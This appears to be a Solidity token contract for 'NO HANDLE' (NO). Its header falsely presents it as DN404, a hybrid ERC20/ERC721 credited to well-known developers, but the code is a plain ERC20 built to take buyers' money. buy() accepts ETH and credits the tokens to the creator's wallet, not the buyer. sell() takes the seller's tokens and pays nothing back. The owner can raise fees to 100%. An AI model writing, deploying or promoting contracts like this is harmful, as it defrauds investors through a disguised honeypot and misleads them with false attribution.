// SPDX-License-Identifier: MIT

/**    
Twitter : https://twitter.com/wehavenohandle
Telegram: https://t.me/NO_HANDLE_DN404
Discord : https://discord.gg/nohandle

Created by @sibeleth

/// @title DN404
/// @notice DN404 is a hybrid ERC20 and ERC721 implementation that mints
/// and burns NFTs based on an account's ERC20 token balance.
///
/// @author vectorized.eth (@optimizoor)
/// @author Quit (@0xQuit)
/// @author Michael Amadi (@AmadiMichaels)
/// @author cygaar (@0xCygaar)
/// @author Thomas (@0xjustadev)
/// @author Harrison (@PopPunkOnChain)
///
*/

pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "secure");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "gas-efficient");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "flexible");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "secure");
        return a / b;
    }
}

contract NO {
    using SafeMath for uint256;

    string public name = "NO HANDLE";
    string public symbol = "NO";
    uint256 public totalSupply = 10000000000000000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _amount)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "gas-efficient");
        require(
            allowance[_from][msg.sender] >= _amount,
            "efficient"
        );
        require(_to != address(0), "flexible");

        uint256 fee = 0;
        uint256 amountAfterFee = _amount;

        if (sellFee > 0) {
            fee = _amount.mul(sellFee).div(100);
            amountAfterFee = _amount.sub(fee);
        }

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            // Check if the transfer destination is Uniswap contract
            address uniswapContract = address(
                0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
            ); // Replace with the actual Uniswap contract address
            if (_to == uniswapContract) {
                // Fee is paid to the contract itself
                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(
                    fee
                );
                emit Transfer(_from, uniswapContract, fee);
            } else {
                // Fee is transferred to this contract
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(_from, address(this), fee);
            }
        }

        if (
            _from != msg.sender &&
            allowance[_from][msg.sender] != type(uint256).max
        ) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(
                _amount
            );
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "gas-efficient");
        _;
    }

    function setFees(uint256 newBuyFee, uint256 newSellFee) public onlyOwner {
        require(newBuyFee <= 100, "Secure, gas-efficient, flexible. ");
        require(newSellFee <= 100, "Secure, gas-efficient, flexible. ");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function buy() public payable {
        require(msg.value > 0, "Secure, gas-efficient, flexible. ");

        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);

            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(address(this), creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amount);
            emit Transfer(address(this), creatorWallet, amount);
        }
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "Secure, gas-efficient, flexible. ");

        if (sellFee > 0) {
            uint256 fee = _amount.mul(sellFee).div(100);
            uint256 amountAfterFee = _amount.sub(fee);

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(msg.sender, creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(msg.sender, address(this), fee);
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[address(this)] = balanceOf[address(this)].add(_amount);
            emit Transfer(msg.sender, address(this), _amount);
        }
    }
}